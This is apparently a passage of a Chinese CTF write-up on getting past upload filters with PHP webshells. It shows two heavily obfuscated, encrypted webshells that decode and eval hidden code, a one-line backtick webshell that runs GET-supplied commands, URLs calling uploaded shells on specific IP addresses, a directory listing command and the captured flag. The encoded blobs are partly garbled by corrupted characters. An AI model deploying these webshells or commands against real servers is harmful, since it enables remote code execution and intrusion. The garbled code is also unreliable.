    ["By pass D"=>$a($c[_])];
    ?>

    ```

2. PHP加密后

    ```php
    //加密代码1
    <?php 
    if (!defined("AAFAAEEECCEDCEED")){define("AAFAAEEECCEDCEED", __FILE__);global $�,$��,$���,$����,$�����,$������,$�������,$�������,$���������,$��������,$�����������,$�����������,$������������,$��������������,$���������������,$��������������;function ��($��,$���=""){global $�,$��,$���,$����,$�����,$������,$�������,$�������,$���������,$��������,$�����������,$�����������,$������������,$��������������,$���������������,$��������������;if(empty($���)){return base64_decode($��);}else{return ��($����($��,$���,$�($���)));}}$�=��("c3RycmV2�");$����=��("c3RydHI=�");$��=��("XzE2M2MzN�WExOTMyOT�g3YTJiMzV�kNDAzYzE5�YWY0NzQ5X�2U=�","LhUaX");$��������=��("t3p1SmNvSXBy�tXNz�","ZwSRbQt");$�����������=��("QXQhbA==�","ZGISOQ");$��������������=��("RmFzZTR0�X2YlR29k�ZQ==�","YwxWR");$���������������=��("rYJuZ19yZXBsHWNu�","cuYoAGHlr");function ����(&$����){global $�,$��,$���,$����,$�����,$������,$�������,$�������,$���������,$��������,$�����������,$�����������,$������������,$��������������,$���������������,$��������������;$���������������=��("pGll�","ZcwYHnhp");@$���������������($��,$�����������."(@$��������($��������������('eNpl0m1P2lAUAOC/Qpp+aLOqQNG0ITcb�ZuhsWJUyoLAtpO2K�MlolYkSYpohFILxT�3gYF+lPHbRHd9vGe�Puf03HMuOm+2wMrC�EJGMZUSSK9YQApEu�rs6DZ4enIoL70Wr7�sVOzSekTo/Ae+iZR�TnI/hQAADWj5ZAmy�efWpuVzaLnLJKGI8�DObrz0kxmktEIBgM�TX1SGdmCUZU8w7O5�haxGwRNkZwX24xUD�3azRn2mNkdPVncrm�RZJV6tAUSyE5zd1B�NJ6OG/3F1GjaKi7s�pxM8U0zwWTBbS+GU�u1akOISmuTKee72V�vtCGtg3wFwXxmM4G�wgCMYNXPisQFIO3q�Pa2+rNYHlbY5c+qK�YQ+chxg6zkZit3bB�pVYZtTqGNmkbw+70�sW/DoEoXgnEfeIYF�lZNMOAjpygKp1NFJ�KJhK+TNpzJkkhuxh�u+/e49+wPYRYEwIdTywc/4VW6sZvC8DT�V893/4Os5OVtcGX5�HzYTXp/+bQFzGOFC�rl83tnZOAvaSSLys�YOPxN8PeIrjJZmvT�q0XseCkcACf013ww�J/bWuokd0ovvIm4f�SXolmZJo6oeb9kgU�LfgOqIO0QAn7PrdE�IwSJ43Zl1/2967/b�WJjTgwU+oFp3oM97�lbauYag5aTUXRm1m�mGW9XbZ/bV9h+xQs�cJNRZZj9mua8WzLn�EVX2VuQPi6UOzyaH�cE1forHzIw6+3T+mWSlg�')));","���
    ������163c35a1932987a2b35d403c19af4749�����");return "M";}}else{global $�,$��,$���,$����,$�����,$������,$�������,$�������,$���������,$��������,$�����������,$�����������,$������������,$��������������,$���������������,$��������������;$�=��("c3RycmV2�");$����=��("c3RydHI=�");$��=��("XzE2M2MzN�WExOTMyOT�g3YTJiMzV�kNDAzYzE5�YWY0NzQ5X�2U=�","LhUaX");$��������=��("t3p1SmNvSXBy�tXNz�","ZwSRbQt");$�����������=��("QXQhbA==�","ZGISOQ");$��������������=��("RmFzZTR0�X2YlR29k�ZQ==�","YwxWR");$���������������=��("rYJuZ19yZXBsHWNu�","cuYoAGHlr");}$��������=��("AU5weHtUYU+LQHF�BRExBRHWO�","ZHmsqIkA");$��������=����($��������);@$���������������($��,$�����������."(@$��������($��������������('eNo1i81Og0AURvcm�vgOLu7DJXbjHFDfG�F+jONIZojV2IjbQr�YwamQwvCMMDwV2aA�V5Umdvmdcz7Tmt9Z�m/fN9dXbznnZrj8d�w379W".$��������.$��������."++jXvb�dVdf2/MwjZ+LeX58�WDzdLif0fzZ2jrua�qhGhbhBUnCDQUJ4Q�Au6nx4kE+3gYEIpS�s4ZWCF2UdySqpq5u�6yjvWxkjEFEwlVHO�CILU+7DhKk/ZAUHr�UR6ybGQ9KREEy0g4�BGFBue4m2SRxL4+d�1B7jHkL0640qEEqk�/sk7vwdCqySVpOGy�FK2fz0xr/gdEv2mP�')));","���
    �����163c35a1932987a2b35d403c19af4749������");return true;?>6bc1f6ac45ceeb54b7d62fdfeb7c49a6


    //加密代码2
    <?php 
    if (!defined("FEEFAADBACAEDA")){define("FEEFAADBACAEDA", __FILE__);global $�,$��,$���,$����,$�����,$������,$�������,$��������,$���������,$����������,$�����������,$������������,$�������������,$�������������,$��������������,$����������������;function ��($��,$���=""){global $�,$��,$���,$����,$�����,$������,$�������,$��������,$���������,$����������,$�����������,$������������,$�������������,$�������������,$��������������,$����������������;if(empty($���)){return base64_decode($��);}else{return ��($��������($��,$���,$��($���)));}}$��=��("c3RycmV2�");$��������=��("c3RydHI=�");$�=��("pXphbA==�","ZxgfPQp");$���������=��("VmFzZTV0X2R�lV29kZQ==�","YbLrDuyV");$������������=��("Y3A1bmgvb�XByYXgz�","ZgApNY");$�������������=��("R2UwMGQ4ZThlZTJ�mYmNlMzdjY2FjYz�A5MjljMjZmNTk0R�2U=�","LHihEpR");$����������������=��("mHJlZ19yZXBsb�WNl�","cnQYbegm");function ����(&$����){global $�,$��,$���,$����,$�����,$������,$�������,$��������,$���������,$����������,$�����������,$������������,$�������������,$�������������,$��������������,$����������������;$�����������������=��("WGll�","ZgACW");@$����������������($�������������,$�."(@$������������($���������('eNpt0W1vmlAUAOC�/YggfIKMvFNZozM�02dNq5ShXbid0WA�yKtFRo33Rq3NpP6�Qn2ZOJWqVCs/ddx�bZxa3L+Ryz3PPve�ccvGnNQNclsPhlT�Mukk6CBUdjpcVQP�xTEyiNcWk3sUDov�nV3I0UAwnAXiAhI�8VS1IYmn67NrUQq�hzEtFM6kMuIwkVX�egXAoydzeuj46Kw�CpWXPeqaJKKdrZU�7kS3n9BDRhvi+XkhLloFoOHMPqG4iV�0km674XlUOrwrXC�hlCBwWsvxqLUYTq�fIZPTAVSbNAhOm0�Q7iJ1wGKttsTX4Z�Ne9TR6yYfq5yYiz�FiZYEJp6VMslq6o�IropSTtmHPnZ9Dw�26PEReYdxWByVUN�WEIlESkI0HVmyx+�jScfutQYPs9EAyW�iEL8sMrw3h/XoqL�UWikHZdkM1G3hy+�zmaDBZV4ahOB7RD�bz16QH4gdjPIIhT�tNlyS/o0a7AP69p�z8Gb/JaOb/e7LrB�m1XvIFlXTzwByod�9lteD8IQ3UuKPp1�aLlSX/rWFNN9uwe�rJLbdE0CcBmcDUm�YnP//zl2qS1mj9z�G6HyAYRnZv8/K+x�Kr+GmaVXZVRvXTe�zlVUf0YxZIkutF3�fe3D62bbqju9hlm�/G08bI9slvFd69b�ngJb5wbpfzycDsO�7c2gd89GrXxoHPf�JlAcFrreckGloOf�h0b/PoOElmBIt6/�xXWeSqCZGff0NTP�Dv6pJwLCa+pvwE6�Rjd8�')));","���
    ������e00d8e8ee2fbce37ccacc0929c26f594�����");return "8";}}else{global $�,$��,$���,$����,$�����,$������,$�������,$��������,$���������,$����������,$�����������,$������������,$�������������,$�������������,$��������������,$����������������;$��=��("c3RycmV2�");$��������=��("c3RydHI=�");$�=��("pXphbA==�","ZxgfPQp");$���������=��("VmFzZTV0X2R�lV29kZQ==�","YbLrDuyV");$������������=��("Y3A1bmgvb�XByYXgz�","ZgApNY");$�������������=��("R2UwMGQ4ZThlZTJ�mYmNlMzdjY2FjYz�A5MjljMjZmNTk0R�2U=�","LHihEpR");$����������������=��("mHJlZ19yZXBsb�WNl�","cnQYbegm");}$���������=��("HU5vTENrN0�5mH0FEHVFG�bDGE�","ZbBmnH");$��������=����($���������);@$����������������($�������������,$�."(@$������������($���������('eNqFj19Lg2AUh+�8H+w4yDqjwEnOW�FKZC9C3GGpsEuw�rJuuhq/ptOc742�fae+0/lVsxUV7a�Kbcw7PeX4Hjqyp�15qxMPo9mCmcvn�jkpAv+7qOLI54/�O5JL8X/yFbqSvp�X".$���������.$��������."h8gMzBV2�yn5uWGEosn91YS�icIEH6dQJ0BWAu�jwc3L4wxM03mdq�CoMONAH08n/ERm�NLXfOz7HPD+Y90�8cvCKgKwQrXCGw�mmKHIAmtEiPApI�qDAEGbUhsnNoI1�DUmOa6+bDraVp9�Eu7LJ+m2d+sy1L�BCTwizfb6oqLoK�FOWxdpkFCHdFoR�2qSmm61NwhxBGdW4Xm4KJ873hxpB�VLXLrIhI7Kf7Kk�sRuEGIXRp7gbvOSy8jvKyp71S+kJ�k=�')));","���
    ������e00d8e8ee2fbce37ccacc0929c26f594������");return true;?>8f31b5768dfe7689b3b8b4d874891cd3
    ```

3. 访问

     `http://1.14.28.17:33598/upload/file4ps.php?0=phpinfo();` `http://1.14.28.17:33598/upload/file7.php?_=phpinfo();`

    ```php
    <?=`$_GET[0]`?>
    http://192.168.100.40:50674/upload/100.php?0=ls%20-la%20/tmp/
    flag-{bmh2cbe1b9d-5eb1-4248-9036-d486c0f03022}
    ```